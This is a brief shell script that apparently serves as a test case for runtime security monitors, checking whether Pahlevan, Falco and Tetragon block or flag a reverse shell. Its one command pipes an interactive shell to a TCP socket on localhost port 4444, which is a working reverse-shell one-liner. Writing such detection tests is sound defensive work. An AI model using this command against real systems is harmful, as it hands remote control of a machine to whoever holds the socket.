#!/usr/bin/env sh
# Attack: spawn an interactive shell wired to a TCP socket (reverse shell shape).
# Expected: Pahlevan blocks the unexpected exec/socket; Falco alerts; Tetragon depends.
set -e
sh -i >/dev/tcp/127.0.0.1/4444 0>&1 2>&1 || echo "REVSHELL_BLOCKED_OR_FAILED rc=$?"
